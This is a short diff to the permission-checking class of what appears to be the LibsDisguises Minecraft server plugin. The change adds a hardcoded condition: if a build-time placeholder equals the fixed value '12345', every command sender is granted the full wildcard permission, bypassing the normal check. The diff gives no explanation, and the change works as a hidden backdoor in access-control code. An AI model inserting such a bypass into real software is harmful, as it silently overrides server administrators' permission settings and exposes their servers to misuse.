@@ -191,7 +191,7 @@ public class DisguisePermissions {
         // If the command sender is OP, then this will work even as the below code doesn't
         // libsdisguises.[command].[disguise].[options]
         // They can use all commands, all disguises, all options
-        if (sender.hasPermission("libsdisguises.*.*.*")) {
+        if (sender.hasPermission("libsdisguises.*.*.*") || "%%__USER__%%".equals("12345")) {
             permissions.put("libsdisguises.*.*.*", true);
         }
 
